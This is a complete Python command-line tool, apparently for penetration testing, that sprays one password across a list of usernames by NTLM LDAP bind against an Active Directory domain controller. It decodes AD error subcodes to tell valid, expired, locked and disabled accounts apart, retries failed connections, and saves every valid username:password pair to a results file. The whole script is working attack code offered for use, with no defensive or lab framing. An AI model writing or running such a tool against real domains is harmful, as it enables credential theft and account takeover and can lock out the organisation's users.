#!/usr/bin/env python3
import os
import sys
import re
import platform
import logging
from datetime import datetime
from time import sleep

from ldap3 import Server, Connection, ALL, NTLM
from ldap3.core.exceptions import LDAPSocketOpenError, LDAPSocketReceiveError
from colorama import Fore, Style, init
import signal

def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)

init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║           Password Spray Attack           ║
    ║    Test One Password Against Many Users   ║
    ╚═══════════════════════════════════════════╝
    """)



def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def check_ip_reachable(dc_ip):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server)
        conn.open()
        conn.unbind()
        return True
    except Exception:
        return False


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def resolve_file_path(user_input):
    user_input = user_input.lstrip('/').lstrip('\\')
    return os.path.normpath(os.path.join(os.getcwd(), user_input))


def validate_userlist_file(file_path):
    full_path = resolve_file_path(file_path)

    if not os.path.exists(full_path):
        print(Fore.RED + f"[!] File not found: {full_path}" + Style.RESET_ALL)
        return None
    if os.path.getsize(full_path) == 0:
        print(Fore.RED + f"[!] File is empty: {full_path}" + Style.RESET_ALL)
        return None
    if not os.access(full_path, os.R_OK):
        print(Fore.RED + f"[!] Cannot read file: {full_path}" + Style.RESET_ALL)
        return None

    with open(full_path, 'r', errors='ignore') as f:
        users = [line.strip() for line in f if line.strip()]

    if not users:
        print(Fore.RED + f"[!] No valid users found in: {full_path}" + Style.RESET_ALL)
        return None

    print(Fore.GREEN + f"[+] Found {len(users)} users in: {full_path}" + Style.RESET_ALL)
    return users


def resolve_output_file(user_input):
    if not user_input:
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        return os.path.join(os.getcwd(), f"spray-results-{timestamp}.txt")

    full_path = resolve_file_path(user_input)
    directory = os.path.dirname(full_path)

    if directory and not os.path.exists(directory):
        try:
            os.makedirs(directory, exist_ok=True)
            print(Fore.YELLOW + f"[*] Created directory: {directory}" + Style.RESET_ALL)
        except PermissionError:
            print(Fore.RED + f"[!] Permission denied: {directory}" + Style.RESET_ALL)
            fallback = os.path.join(os.getcwd(), os.path.basename(user_input))
            print(Fore.YELLOW + f"[*] Saving to: {fallback}" + Style.RESET_ALL)
            return fallback
        except Exception as e:
            print(Fore.RED + f"[!] Cannot create directory: {e}" + Style.RESET_ALL)
            sys.exit(1)

    return full_path


def try_login(dc_ip, domain, username, password, timeout=5):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=timeout)
        conn   = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            receive_timeout=timeout
        )

        conn.open()
        conn.bind()

        result_code    = conn.result.get('result', -1)
        result_message = conn.result.get('message', '').lower()
        result_desc    = conn.result.get('description', '').lower()

        if result_code == 0:
            conn.unbind()
            return "success"

        if result_code == 49:
            if '52e' in result_message:
                return "wrong_password"
            elif '532' in result_message:
                return "password_expired"
            elif '773' in result_message:
                return "must_change_password"
            elif '533' in result_message:
                return "account_disabled"
            elif '701' in result_message:
                return "account_expired"
            elif '775' in result_message:
                return "account_locked"
            elif '530' in result_message:
                return "logon_not_permitted"
            elif 'invalidcredentials' in result_desc or 'invalid credentials' in result_desc:
                return "wrong_password"
            else:
                return "wrong_password"

        return f"unknown: {result_code}"

    except LDAPSocketOpenError:
        return "connection_failed"

    except LDAPSocketReceiveError:
        return "timeout"

    except Exception as e:
        error = str(e).lower()
        if '52e' in error or 'invalidcredentials' in error or 'invalid credentials' in error:
            return "wrong_password"
        elif '532' in error or 'password expired' in error:
            return "password_expired"
        elif '773' in error or 'must change' in error:
            return "must_change_password"
        elif '533' in error or 'account disabled' in error:
            return "account_disabled"
        elif '701' in error or 'account expired' in error:
            return "account_expired"
        elif '775' in error or 'account locked' in error:
            return "account_locked"
        elif '530' in error or 'not permitted' in error:
            return "logon_not_permitted"
        return f"error: {e}"


def run_spray(dc_ip, domain, userlist, password, output_file, delay=0):
    print(Fore.YELLOW + f"\n[*] Starting Password Spray attack..." + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Target DC    : {dc_ip}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Domain       : {domain}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Password     : {password}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Total users  : {len(userlist)}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Delay        : {delay}s between attempts" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Output file  : {output_file}" + Style.RESET_ALL)
    print(Fore.CYAN   + "-" * 50 + Style.RESET_ALL)

    valid_creds      = []
    must_change      = []
    expired_creds    = []
    locked_users     = []
    disabled_users   = []
    failed           = 0
    errors           = 0

    try:
        fd = open(output_file, 'w')
        fd.write(f"Password Spray Results\n")
        fd.write(f"Date     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        fd.write(f"Target   : {dc_ip}\n")
        fd.write(f"Domain   : {domain}\n")
        fd.write(f"Password : {password}\n")
        fd.write(f"Users    : {len(userlist)}\n")
        fd.write("-" * 50 + "\n\n")
    except Exception as e:
        print(Fore.RED + f"[!] Cannot create output file: {e}" + Style.RESET_ALL)
        fd = None

    for i, username in enumerate(userlist, 1):
        progress = f"[{i}/{len(userlist)}]"
        result   = try_login(dc_ip, domain, username, password)

        if result == "success":
            valid_creds.append(username)
            msg = f"{progress} [+] VALID CREDENTIALS: {username}:{password}"
            print(Fore.GREEN + msg + Style.RESET_ALL)
            if fd:
                fd.write(f"[VALID] {username}:{password}\n")

        elif result == "must_change_password":
            must_change.append(username)
            msg = f"{progress} [!] MUST CHANGE PASSWORD (valid): {username}:{password}"
            print(Fore.YELLOW + msg + Style.RESET_ALL)
            if fd:
                fd.write(f"[MUST_CHANGE] {username}:{password}\n")

        elif result == "password_expired":
            expired_creds.append(username)
            msg = f"{progress} [!] PASSWORD EXPIRED (valid): {username}:{password}"
            print(Fore.YELLOW + msg + Style.RESET_ALL)
            if fd:
                fd.write(f"[EXPIRED] {username}:{password}\n")

        elif result == "account_locked":
            locked_users.append(username)
            msg = f"{progress} [!] ACCOUNT LOCKED: {username}"
            print(Fore.RED + msg + Style.RESET_ALL)
            if fd:
                fd.write(f"[LOCKED] {username}\n")

        elif result == "account_disabled":
            disabled_users.append(username)
            msg = f"{progress} [-] Account disabled: {username}"
            print(Fore.WHITE + msg + Style.RESET_ALL)
            if fd:
                fd.write(f"[DISABLED] {username}\n")

        elif result == "account_expired":
            disabled_users.append(username)
            msg = f"{progress} [-] Account expired: {username}"
            print(Fore.WHITE + msg + Style.RESET_ALL)
            if fd:
                fd.write(f"[EXPIRED_ACCOUNT] {username}\n")

        elif result == "logon_not_permitted":
            failed += 1
            print(Fore.WHITE + f"{progress} [-] Logon not permitted: {username}" + Style.RESET_ALL)

        elif result == "wrong_password":
            failed += 1
            print(Fore.WHITE + f"{progress} [-] Failed: {username}" + Style.RESET_ALL)

        elif result == "connection_failed":
            errors += 1
            print(Fore.RED + f"{progress} [!] Connection failed for: {username}" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Waiting 5 seconds before retrying..." + Style.RESET_ALL)
            sleep(5)
            retry = try_login(dc_ip, domain, username, password)
            if retry == "success":
                valid_creds.append(username)
                print(Fore.GREEN + f"[+] VALID CREDENTIALS (retry): {username}:{password}" + Style.RESET_ALL)
                if fd:
                    fd.write(f"[VALID] {username}:{password}\n")
            elif retry == "must_change_password":
                must_change.append(username)
                print(Fore.YELLOW + f"[!] MUST CHANGE PASSWORD (retry): {username}:{password}" + Style.RESET_ALL)
                if fd:
                    fd.write(f"[MUST_CHANGE] {username}:{password}\n")
            else:
                print(Fore.RED + f"[-] Retry failed for: {username}" + Style.RESET_ALL)

        elif result == "timeout":
            errors += 1
            print(Fore.YELLOW + f"{progress} [!] Timeout for: {username}" + Style.RESET_ALL)

        else:
            errors += 1
            print(Fore.YELLOW + f"{progress} [!] {username}: {result}" + Style.RESET_ALL)

        if delay > 0:
            sleep(delay)

    if fd:
        fd.write("\n" + "-" * 50 + "\n")
        fd.write(f"SUMMARY\n")
        fd.write(f"Valid credentials      : {len(valid_creds)}\n")
        fd.write(f"Must change password   : {len(must_change)}\n")
        fd.write(f"Expired passwords      : {len(expired_creds)}\n")
        fd.write(f"Locked accounts        : {len(locked_users)}\n")
        fd.write(f"Disabled accounts      : {len(disabled_users)}\n")
        fd.write(f"Failed attempts        : {failed}\n")
        fd.write(f"Errors                 : {errors}\n")
        fd.close()

    print(Fore.CYAN + "\n" + "=" * 50 + Style.RESET_ALL)
    print(Fore.CYAN + "[*] SPRAY SUMMARY" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN  + f"[+] Valid credentials      : {len(valid_creds)}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[!] Must change password   : {len(must_change)}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[!] Expired passwords      : {len(expired_creds)}" + Style.RESET_ALL)
    print(Fore.RED    + f"[!] Locked accounts        : {len(locked_users)}" + Style.RESET_ALL)
    print(Fore.WHITE  + f"[-] Disabled accounts      : {len(disabled_users)}" + Style.RESET_ALL)
    print(Fore.WHITE  + f"[-] Failed attempts        : {failed}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[!] Errors                 : {errors}" + Style.RESET_ALL)

    if valid_creds:
        print(Fore.GREEN + "\n[+] Valid credentials found:" + Style.RESET_ALL)
        for user in valid_creds:
            print(Fore.GREEN + f"     {user}:{password}" + Style.RESET_ALL)

    if must_change:
        print(Fore.YELLOW + "\n[!] Must change password (still valid):" + Style.RESET_ALL)
        for user in must_change:
            print(Fore.YELLOW + f"     {user}:{password}" + Style.RESET_ALL)

    if expired_creds:
        print(Fore.YELLOW + "\n[!] Expired (but valid) credentials:" + Style.RESET_ALL)
        for user in expired_creds:
            print(Fore.YELLOW + f"     {user}:{password}" + Style.RESET_ALL)

    if locked_users:
        print(Fore.RED + "\n[!] Locked accounts detected:" + Style.RESET_ALL)
        for user in locked_users:
            print(Fore.RED + f"    ✘ {user}" + Style.RESET_ALL)

    if output_file:
        print(Fore.CYAN + f"\n[*] Results saved to: {output_file}" + Style.RESET_ALL)


if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain = get_input(
        Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
        validate_domain, "Invalid domain! Example: cs.org"
    )

    while True:
        list_input = get_input(
            Fore.CYAN   + "[?] Enter userlist path  : " + Style.RESET_ALL +
            Fore.YELLOW + "(e.g. users.txt or /lists/users.txt) " + Style.RESET_ALL
        )
        userlist = validate_userlist_file(list_input)
        if userlist:
            break

    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    delay_input = get_input(
        Fore.CYAN   + "[?] Delay between attempts: " + Style.RESET_ALL +
        Fore.YELLOW + "(seconds, default: 0) " + Style.RESET_ALL,
        allow_empty=True
    )
    try:
        delay = float(delay_input) if delay_input else 0
        if delay < 0:
            delay = 0
    except ValueError:
        print(Fore.YELLOW + "[!] Invalid delay, using 0" + Style.RESET_ALL)
        delay = 0

    timestamp    = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    default_name = f"spray-results-{timestamp}.txt"
    out_input    = get_input(
        Fore.CYAN   + f"[?] Output filename      : " + Style.RESET_ALL +
        Fore.YELLOW + f"(default: {default_name}) " + Style.RESET_ALL,
        allow_empty=True
    )
    output_file = resolve_output_file(out_input if out_input else "")

    run_spray(dc_ip, domain, userlist, password, output_file, delay)
